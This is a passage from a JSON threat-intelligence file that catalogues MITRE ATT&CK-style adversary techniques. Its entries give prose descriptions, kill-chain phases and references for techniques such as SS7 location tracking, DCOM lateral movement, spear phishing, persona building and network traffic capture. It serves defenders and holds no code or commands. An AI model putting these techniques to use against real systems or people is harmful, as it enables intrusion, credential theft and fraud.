          "https://www.fcc.gov/files/csric5-wg10-finalreport031517pdf"
        ]
      },
      "uuid": "52651225-0b3a-482d-aa7e-10618fd063b5",
      "value": "Exploit SS7 to Track Device Location - T1450"
    },
    {
      "description": "On versions of Android prior to 4.1, an adversary may use a malicious application that holds the READ_LOGS permission to obtain private keys, passwords, other credentials, or other sensitive data stored in the device's system log. On Android 4.1 and later, an adversary would need to attempt to perform an operating system privilege escalation attack to be able to access the log.",
      "meta": {
        "external_id": "APP-13",
        "kill_chain": [
          "mitre-mobile-attack:collection",
          "mitre-mobile-attack:credential-access"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1413",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-3.html",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-13.html"
        ]
      },
      "uuid": "29e07491-8947-43a3-8d4e-9a787c45f3d3",
      "value": "Access Sensitive Data in Device Logs - T1413"
    },
    {
      "description": "An adversary could steal developer account credentials on an app store and/or signing keys to publish malicious updates to existing Android or iOS apps, or to abuse the developer's identity and reputation to publish new malicious applications. For example, Infoworld describes this technique and suggests mitigations in  (Citation: Infoworld-Appstore).\n\nDetection: Developers can regularly scan (or have a third party scan on their behalf) the app stores for presence of unauthorized apps that were submitted using the developer's identity.\n\nPlatforms: Android, iOS",
      "meta": {
        "external_id": "T1441",
        "refs": [
          "https://attack.mitre.org/techniques/T1441"
        ]
      },
      "related": [
        {
          "dest-uuid": "d9db3d46-66ca-44b4-9daa-1ef97cb7465a",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "a21a6a79-f9a1-4c87-aed9-ba2d79536881",
      "value": "Stolen Developer Credentials or Signing Keys - T1441"
    },
    {
      "description": "Adversaries may use the Windows Component Object Model (COM) and Distributed Component Object Model (DCOM) for local code execution or to execute on remote systems as part of lateral movement. \n\nCOM is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) DCOM is transparent middleware that extends the functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. (Citation: Microsoft COM ACL)(Citation: Microsoft Process Wide Com Keys)(Citation: Microsoft System Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nAdversaries may abuse COM for local command and/or payload execution. Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and VBScript.(Citation: Microsoft COM) Specific COM objects also exists to directly perform functions beyond code execution, such as creating a [Scheduled Task](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors such as Privilege Escalation and Persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)\n\nAdversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications (Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents (Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1173) (DDE) execution directly through a COM created instance of a Microsoft Office application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.",
      "meta": {
        "external_id": "T1175",
        "kill_chain": [
          "mitre-attack:lateral-movement",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "PowerShell logs",
          "API monitoring",
          "Authentication logs",
          "DLL monitoring",
          "Packet capture",
          "Process monitoring",
          "Windows Registry",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1175",
          "https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html",
          "https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx",
          "https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1",
          "https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx",
          "https://msdn.microsoft.com/en-us/library/windows/desktop/ms694331(v=vs.85).aspx",
          "https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html",
          "https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/",
          "https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/",
          "https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/",
          "https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/",
          "https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom"
        ]
      },
      "uuid": "772bc7a8-a157-42cc-8728-d648e25c7fe7",
      "value": "Component Object Model and Distributed COM - T1175"
    },
    {
      "description": "Both newly built personas and pre-compromised personas may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. (Citation: NEWSCASTER2014) (Citation: BlackHatRobinSage) (Citation: RobinSageInterview)",
      "meta": {
        "external_id": "T1342",
        "kill_chain": [
          "mitre-pre-attack:persona-development"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1342"
        ]
      },
      "uuid": "271e6d40-e191-421a-8f87-a8102452c201",
      "value": "Develop social network persona digital footprint - T1342"
    },
    {
      "description": "Once a 3rd party vendor has been identified as being of interest it can be probed for vulnerabilities just like the main target would be. (Citation: Zetter2015Threats) (Citation: WSJTargetBreach)",
      "meta": {
        "external_id": "T1298",
        "kill_chain": [
          "mitre-pre-attack:organizational-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1298"
        ]
      },
      "uuid": "1def484d-2343-470d-8925-88f45b5f9615",
      "value": "Assess vulnerability of 3rd party vendors - T1298"
    },
    {
      "description": "An adversary could use access to a compromised device's credentials to attempt to manipulate app store rankings or ratings by triggering application downloads or posting fake reviews of applications. This technique likely requires privileged access (a rooted or jailbroken device).",
      "meta": {
        "external_id": "T1452",
        "kill_chain": [
          "mitre-mobile-attack:impact"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1452"
        ]
      },
      "uuid": "76c12fc8-a4eb-45d6-a3b7-e371a7248f69",
      "value": "Manipulate App Store Rankings or Ratings - T1452"
    },
    {
      "description": "Open source intelligence (OSINT) is intelligence gathered from publicly available sources. This can include both information gathered on-line, such as from search engines, as well as in the physical world. (Citation: RSA-APTRecon)",
      "meta": {
        "external_id": "T1247",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1247"
        ]
      },
      "related": [
        {
          "dest-uuid": "028ad431-84c5-4eb7-a364-2b797c234f88",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "2b9a666e-bd59-4f67-9031-ed41b428e04a",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "784ff1bc-1483-41fe-a172-4cd9ae25c06b",
      "value": "Acquire OSINT data sets and information - T1247"
    },
    {
      "description": "Open source intelligence (OSINT) provides free, readily available information about a target while providing the target no indication they are of interest.  Such information can assist an adversary in crafting a successful approach for compromise. (Citation: RSA-APTRecon)",
      "meta": {
        "external_id": "T1266",
        "kill_chain": [
          "mitre-pre-attack:people-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1266"
        ]
      },
      "related": [
        {
          "dest-uuid": "028ad431-84c5-4eb7-a364-2b797c234f88",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "784ff1bc-1483-41fe-a172-4cd9ae25c06b",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "2b9a666e-bd59-4f67-9031-ed41b428e04a",
      "value": "Acquire OSINT data sets and information - T1266"
    },
    {
      "description": "Data sets can be anything from Security Exchange Commission (SEC) filings to public phone numbers. Many datasets are now either publicly available for free or can be purchased from a variety of data vendors.  Open source intelligence (OSINT) is intelligence gathered from publicly available sources. This can include both information gathered on-line as well as in the physical world. (Citation: SANSThreatProfile) (Citation: Infosec-osint) (Citation: isight-osint)",
      "meta": {
        "external_id": "T1277",
        "kill_chain": [
          "mitre-pre-attack:organizational-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1277"
        ]
      },
      "related": [
        {
          "dest-uuid": "2b9a666e-bd59-4f67-9031-ed41b428e04a",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "784ff1bc-1483-41fe-a172-4cd9ae25c06b",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "028ad431-84c5-4eb7-a364-2b797c234f88",
      "value": "Acquire OSINT data sets and information - T1277"
    },
    {
      "description": "During mergers, divestitures, or other period of change in joint infrastructure or business processes there may be an opportunity for exploitation. During this type of churn, unusual requests, or other non standard practices may not be as noticeable. (Citation: RossiMergers) (Citation: MeidlHealthMergers)",
      "meta": {
        "external_id": "T1299",
        "kill_chain": [
          "mitre-pre-attack:organizational-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1299"
        ]
      },
      "uuid": "e2aa077d-60c9-4de5-b015-a9c382877cd9",
      "value": "Assess opportunities created by business deals - T1299"
    },
    {
      "description": "Fake certificates can be acquired by legal process or coercion. Or, an adversary can trick a Certificate Authority into issuing a certificate. These fake certificates can be used as a part of Man-in-the-Middle attacks. (Citation: SubvertSSL)",
      "meta": {
        "external_id": "T1338",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1338"
        ]
      },
      "uuid": "54a42187-a20c-4e4e-ba31-8d15c9e1f57f",
      "value": "SSL certificate acquisition for trust breaking - T1338"
    },
    {
      "description": "As with legitimate development efforts, different skill sets may be required for different phases of an attack. The skills needed may be located in house, can be developed, or may need to be contracted out. (Citation: APT1)",
      "meta": {
        "external_id": "T1348",
        "kill_chain": [
          "mitre-pre-attack:build-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1348"
        ]
      },
      "uuid": "c9fb4451-729d-4771-b205-52c1829f949c",
      "value": "Identify resources required to build capabilities - T1348"
    },
    {
      "description": "During production and distribution, the placement of software, firmware, or a CPU chip in a computer, handheld, or other electronic device that enables an adversary to gain illegal entrance. (Citation: McDRecall) (Citation: SeagateMaxtor)",
      "meta": {
        "external_id": "T1365",
        "kill_chain": [
          "mitre-pre-attack:stage-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1365"
        ]
      },
      "uuid": "388f3a5c-2cdd-466c-9159-b507fa429fcd",
      "value": "Hardware or software supply chain implant - T1365"
    },
    {
      "description": "Malware may perform differently on different platforms (computer vs handheld) and different operating systems ([Ubuntu](http://www.ubuntu.com) vs [OS X](http://www.apple.com/osx)), and versions ([Windows](http://windows.microsoft.com) 7 vs 10) so malicious actors will test their malware in the environment(s) where they most expect it to be executed. (Citation: BypassMalwareDefense)",
      "meta": {
        "external_id": "T1357",
        "kill_chain": [
          "mitre-pre-attack:test-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1357"
        ]
      },
      "uuid": "e042a41b-5ecf-4f3a-8f1f-1b528c534772",
      "value": "Test malware in various execution environments - T1357"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nSocial Engineering is the practice of manipulating people in order to get them to divulge information or take an action. Human Intelligence (HUMINT) is intelligence collected and provided by human sources. (Citation: 17millionScam) (Citation: UbiquityEmailScam)",
      "meta": {
        "external_id": "T1376",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1376"
        ]
      },
      "uuid": "b79a1960-d0be-4b51-bb62-b27e91e1dea0",
      "value": "Conduct social engineering or HUMINT operation - T1376"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nEmails with malicious attachments are designed to get a user to open/execute the attachment in order to deliver malware payloads. (Citation: APT1)",
      "meta": {
        "external_id": "T1367",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1367"
        ]
      },
      "uuid": "e24a9f99-cb76-42a3-a50b-464668773e97",
      "value": "Spear phishing messages with malicious attachments - T1367"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nClicking on links in email, opening attachments, or visiting websites that result in drive by downloads can all result in compromise due to users performing actions of a cyber nature. (Citation: AnonHBGary)",
      "meta": {
        "external_id": "T1386",
        "kill_chain": [
          "mitre-pre-attack:compromise"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1386"
        ]
      },
      "uuid": "0440f60f-9056-4791-a740-8eae96eb61fa",
      "value": "Authorized user performs requested cyber action - T1386"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nEmails with text only phishing messages do not contain any attachments or links to websites. They are designed to get a user to take a follow on action such as calling a phone number or wiring money. They can also be used to elicit an email response to confirm existence of an account or user. (Citation: Paypal Phone Scam)",
      "meta": {
        "external_id": "T1368",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1368"
        ]
      },
      "uuid": "2fc04aa5-48c1-49ec-919a-b88241ef1d17",
      "value": "Spear phishing messages with text only - T1368"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nEmails with malicious links are designed to get a user to click on the link in order to deliver malware payloads. (Citation: GoogleDrive Phishing) (Citation: RSASEThreat)",
      "meta": {
        "external_id": "T1369",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1369"
        ]
      },
      "uuid": "489a7797-01c3-4706-8cd1-ec56a9db3adc",
      "value": "Spear phishing messages with malicious links - T1369"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nIf an adversary can gain physical access to the target's environment they can introduce a variety of  devices that provide compromise mechanisms. This could include installing keyboard loggers, adding routing/wireless equipment, or connecting computing devices. (Citation: Credit Card Skimmers)",
      "meta": {
        "external_id": "T1387",
        "kill_chain": [
          "mitre-pre-attack:compromise"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1387"
        ]
      },
      "uuid": "b3253d9e-ba11-430f-b5a3-4db844ce5413",
      "value": "Unauthorized user introduces compromise delivery mechanism - T1387"
    },
    {
      "description": "If an adversary can escalate privileges, he or she may be able to use those privileges to place malicious code in the device kernel or other boot partition components, where the code may evade detection, may persist after device resets, and may not be removable by the device user. In some cases (e.g., the Samsung Knox warranty bit as described under Detection), the attack may be detected but could result in the device being placed in a state that no longer allows certain functionality.\n\nMany Android devices provide the ability to unlock the bootloader for development purposes, but doing so introduces the potential ability for others to maliciously update the kernel or other boot partition code.\n\nIf the bootloader is not unlocked, it may still be possible to exploit device vulnerabilities to update the code.",
      "meta": {
        "external_id": "APP-27",
        "kill_chain": [
          "mitre-mobile-attack:defense-evasion",
          "mitre-mobile-attack:persistence"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1398",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-26.html",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-27.html",
          "https://www2.samsungknox.com/en/faq/what-knox-warranty-bit-and-how-it-triggered",
          "https://www.apple.com/business/docs/iOS_Security_Guide.pdf"
        ]
      },
      "uuid": "46d818a5-67fa-4585-a7fc-ecf15376c8d5",
      "value": "Modify OS Kernel or Boot Partition - T1398"
    },
    {
      "description": "If the mobile device is connected (typically via USB) to a charging station or a PC, for example to charge the device's battery, then a compromised or malicious charging station or PC could attempt to exploit the mobile device via the connection(Citation: Krebs-JuiceJacking).\n\nPrevious demonstrations have included:\n\n* Injecting malicious applications into iOS devices(Citation: Lau-Mactans).\n* Exploiting a Nexus 6 or 6P device over USB and gaining the ability to perform actions including intercepting phone calls, intercepting network traffic, and obtaining the device physical location(Citation: IBM-NexusUSB).\n* Exploiting Android devices such as the Google Pixel 2 over USB(Citation: GoogleProjectZero-OATmeal).\n\nProducts from Cellebrite and Grayshift purportedly can use physical access to the data port to unlock the passcode on some iOS devices(Citation: Computerworld-iPhoneCracking).",
      "meta": {
        "external_id": "PHY-1",
        "kill_chain": [
          "mitre-mobile-attack:initial-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1458",
          "https://pages.nist.gov/mobile-threat-catalogue/physical-threats/PHY-1.html",
          "http://krebsonsecurity.com/2011/08/beware-of-juice-jacking/",
          "https://media.blackhat.com/us-13/US-13-Lau-Mactans-Injecting-Malware-into-iOS-Devices-via-Malicious-Chargers-WP.pdf",
          "https://securityintelligence.com/android-vulnerabilities-attacking-nexus-6-and-6p-custom-boot-modes/",
          "https://googleprojectzero.blogspot.com/2018/09/oatmeal-on-universal-cereal-bus.html",
          "https://www.computerworld.com/article/3268729/apple-ios/two-vendors-now-sell-iphone-cracking-technology-and-police-are-buying.html"
        ]
      },
      "uuid": "667e5707-3843-4da8-bd34-88b922526f0d",
      "value": "Exploit via Charging Station or PC - T1458"
    },
    {
      "description": "Malicious applications are a common attack vector used by adversaries to gain a presence on mobile devices. This technique describes installing a malicious application on targeted mobile devices without involving an authorized app store (e.g., Google Play Store or Apple App Store). Adversaries may wish to avoid placing malicious applications in an authorized app store due to increased potential risk of detection or other reasons. However, mobile devices often are configured to allow application installation only from an authorized app store which would prevent this technique from working.\n\nDelivery methods for the malicious application include:\n\n* [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) - Including the mobile app package as an attachment to an email message.\n* [Spearphishing Link](https://attack.mitre.org/techniques/T1192) - Including a link to the mobile app package within an email, text message (e.g. SMS, iMessage, Hangouts, WhatsApp, etc.), web site, QR code, or other means.\n* Third-Party App Store - Installed from a third-party app store (as opposed to an authorized app store that the device implicitly trusts as part of its default behavior), which may not apply the same level of scrutiny to apps as applied by an authorized app store.(Citation: IBTimes-ThirdParty)(Citation: TrendMicro-RootingMalware)(Citation: TrendMicro-FlappyBird)\n\nSome Android malware comes with functionality to install additional applications, either automatically or when the adversary instructs it to.(Citation: android-trojan-steals-paypal-2fa)",
      "meta": {
        "external_id": "ECO-21",
        "kill_chain": [
          "mitre-mobile-attack:initial-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1476",
          "https://pages.nist.gov/mobile-threat-catalogue/authentication-threats/AUT-9.html",
          "https://pages.nist.gov/mobile-threat-catalogue/ecosystem-threats/ECO-13.html",
          "https://pages.nist.gov/mobile-threat-catalogue/ecosystem-threats/ECO-21.html",
          "https://www.ibtimes.co.uk/danger-lurks-third-party-android-app-stores-1544861",
          "https://blog.trendmicro.com/trendlabs-security-intelligence/user-beware-rooting-malware-found-in-3rd-party-app-stores/",
          "https://blog.trendmicro.com/trendlabs-security-intelligence/flappy-bird-and-third-party-app-stores/",
          "https://www.welivesecurity.com/2018/12/11/android-trojan-steals-money-paypal-accounts-2fa/"
        ]
      },
      "uuid": "53263a67-075e-48fa-974b-91c5b5445db7",
      "value": "Deliver Malicious App via Other Means - T1476"
    },
    {
      "description": "An adversary may stage software and tools for use during later stages of an attack. The software and tools may be placed on systems legitimately in use by the adversary or may be placed on previously compromised infrastructure. (Citation: APT1) (Citation: RedOctober)",
      "meta": {
        "external_id": "T1362",
        "kill_chain": [
          "mitre-pre-attack:stage-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1362"
        ]
      },
      "uuid": "e8471f43-2742-4fd7-9af7-8ed1330ada37",
      "value": "Upload, install, and configure software/tools - T1362"
    },
    {
      "description": "An Android application can listen for the BOOT_COMPLETED broadcast, ensuring that the app's functionality will be activated every time the device starts up without having to wait for the device user to manually start the app.\n\nAn analysis published in 2012(Citation: Zhou) of 1260 Android malware samples belonging to 49 families of malware determined that 29 malware families and 83.3% of the samples listened for BOOT_COMPLETED.",
      "meta": {
        "external_id": "T1402",
        "kill_chain": [
          "mitre-mobile-attack:persistence"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1402",
          "http://ieeexplore.ieee.org/document/6234407"
        ]
      },
      "uuid": "bd4d32f5-eed4-4018-a649-40b229dd1d69",
      "value": "App Auto-Start at Device Boot - T1402"
    },
    {
      "description": "Once a persona has been developed an adversary will use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others. (Citation: NEWSCASTER2014) (Citation: BlackHatRobinSage)",
      "meta": {
        "external_id": "T1344",
        "kill_chain": [
          "mitre-pre-attack:persona-development"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1344"
        ]
      },
      "related": [
        {
          "dest-uuid": "eacd1efe-ee30-4b03-b58f-5b3b1adfe45d",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "103d72e6-7e0d-4b3a-9373-c38567305c33",
      "value": "Friend/Follow/Connect to targets of interest - T1344"
    },
    {
      "description": "A form of social engineering designed build trust and to lay the foundation for future interactions or attacks. (Citation: BlackHatRobinSage)",
      "meta": {
        "external_id": "T1364",
        "kill_chain": [
          "mitre-pre-attack:stage-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1364"
        ]
      },
      "related": [
        {
          "dest-uuid": "103d72e6-7e0d-4b3a-9373-c38567305c33",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "eacd1efe-ee30-4b03-b58f-5b3b1adfe45d",
      "value": "Friend/Follow/Connect to targets of interest - T1364"
    },
    {
      "description": "Personnel internally to a company may have non-electronic specialized access, authorities, or privilege that make them an attractive target for an adversary.  One example of this is an individual with financial authority to authorize large transactions.  An adversary who compromises this individual might be able to subvert large dollar transfers. (Citation: RSA-APTRecon)",
      "meta": {
        "external_id": "T1271",
        "kill_chain": [
          "mitre-pre-attack:people-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1271"
        ]
      },
      "uuid": "762771c2-3675-4535-88e9-b1f891758974",
      "value": "Identify personnel with an authority/privilege - T1271"
    },
    {
      "description": "Applicable agencies and/or personnel receive intelligence requirements and evaluate them to determine sub-requirements related to topics, questions, or requirements.  For example, an adversary's  nuclear energy requirements may be further divided into nuclear facilities versus nuclear warhead capabilities. (Citation: AnalystsAndPolicymaking)",
      "meta": {
        "external_id": "T1239",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-direction"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1239"
        ]
      },
      "uuid": "acfcbe7a-4dbc-4471-be2b-134faf479e3e",
      "value": "Receive KITs/KIQs and determine requirements - T1239"
    },
    {
      "description": "Job postings, on either company sites, or in other forums, provide information on organizational structure and often provide contact information for someone within the organization. This may give an adversary  information on technologies within the organization which could be valuable in attack or provide insight in to possible security weaknesses or limitations in detection or protection mechanisms. (Citation: JobPostingThreat)",
      "meta": {
        "external_id": "T1248",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1248"
        ]
      },
      "related": [
        {
          "dest-uuid": "0722cd65-0c83-4c89-9502-539198467ab1",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "7718e92f-b011-4f88-b822-ae245a1de407",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "c721b235-679a-4d76-9ae9-e08921fccf84",
      "value": "Identify job postings and needs/gaps - T1248"
    },
    {
      "description": "An adversary can probe a victim's network to determine configurations. The configurations may provide opportunities to route traffic through the network in an undetected or less detectable way. (Citation: OSFingerprinting2014)",
      "meta": {
        "external_id": "T1294",
        "kill_chain": [
          "mitre-pre-attack:technical-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1294"
        ]
      },
      "uuid": "a1e8d61b-22e1-4983-8485-96420152ecd8",
      "value": "Analyze hardware/software security defensive capabilities - T1294"
    },
    {
      "description": "Email addresses, logon credentials, and other forms of online identification typically share a common format. This makes guessing other credentials within the same domain easier. For example if a known email address is first.last@company.com it is likely that others in the company will have an email in the same format. (Citation: RSA-APTRecon)",
      "meta": {
        "external_id": "T1255",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1255"
        ]
      },
      "uuid": "ef0f816a-d561-4953-84c6-2a2936c96957",
      "value": "Discover target logon/email address format - T1255"
    },
    {
      "description": "Job postings, on either company sites, or in other forums, provide information on organizational structure and often provide contact information for someone within the organization. This may give an adversary  information on people within the organization which could be valuable in social engineering attempts. (Citation: JobPostingThreat)",
      "meta": {
        "external_id": "T1267",
        "kill_chain": [
          "mitre-pre-attack:people-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1267"
        ]
      },
      "related": [
        {
          "dest-uuid": "c721b235-679a-4d76-9ae9-e08921fccf84",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "7718e92f-b011-4f88-b822-ae245a1de407",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "0722cd65-0c83-4c89-9502-539198467ab1",
      "value": "Identify job postings and needs/gaps - T1267"
    },
    {
      "description": "Job postings, on either company sites, or in other forums, provide information on organizational structure, needs, and gaps in an organization. This may give an adversary an indication of weakness in an organization (such as under-resourced IT shop). Job postings can also provide information on an organizations structure which could be valuable in social engineering attempts. (Citation: JobPostingThreat) (Citation: RSA-APTRecon)",
      "meta": {
        "external_id": "T1278",
        "kill_chain": [
          "mitre-pre-attack:organizational-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1278"
        ]
      },
      "related": [
        {
          "dest-uuid": "0722cd65-0c83-4c89-9502-539198467ab1",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "c721b235-679a-4d76-9ae9-e08921fccf84",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "7718e92f-b011-4f88-b822-ae245a1de407",
      "value": "Identify job postings and needs/gaps - T1278"
    },
    {
      "description": "Analyze strengths and weaknesses of the target for potential areas of where to focus compromise efforts. (Citation: FakeLinkedIn)",
      "meta": {
        "external_id": "T1300",
        "kill_chain": [
          "mitre-pre-attack:organizational-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1300"
        ]
      },
      "related": [
        {
          "dest-uuid": "96eb59d1-6c46-44bb-bfcd-56be02a00d41",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "092f05e3-f7c0-4cd2-91be-3a8d6ed3cadc",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "7baccb84-356c-4e89-8c5d-58e701f033fc",
      "value": "Analyze organizational skillsets and deficiencies - T1300"
    },
    {
      "description": "Exfiltration could occur over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel. Adversaries could choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
      "meta": {
        "external_id": "T1011",
        "kill_chain": [
          "mitre-attack:exfiltration"
        ],
        "mitre_data_sources": [
          "User interface",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1011"
        ]
      },
      "uuid": "51ea26b1-ff1e-4faa-b1a0-1114cd298c87",
      "value": "Exfiltration Over Other Network Medium - T1011"
    },
    {
      "description": "An adversary may capture network traffic to and from the device to obtain credentials or other sensitive data, or redirect network traffic to flow through an adversary-controlled gateway to do the same.\n\nA malicious app could register itself as a VPN client on Android or iOS to gain access to network packets. However, on both platforms, the user must grant consent to the app to act as a VPN client, and on iOS the app requires a special entitlement that must be granted by Apple.\n\nAlternatively, if a malicious app is able to escalate operating system privileges, it may be able to use those privileges to gain access to network traffic.\n\nAn adversary could redirect network traffic to an adversary-controlled gateway by establishing a VPN connection or by manipulating the device's proxy settings. For example, Skycure (Citation: Skycure-Profiles) describes the ability to redirect network traffic by installing a malicious iOS Configuration Profile.\n\nIf applications encrypt their network traffic, sensitive data may not be accessible to an adversary, depending on the point of capture.",
      "meta": {
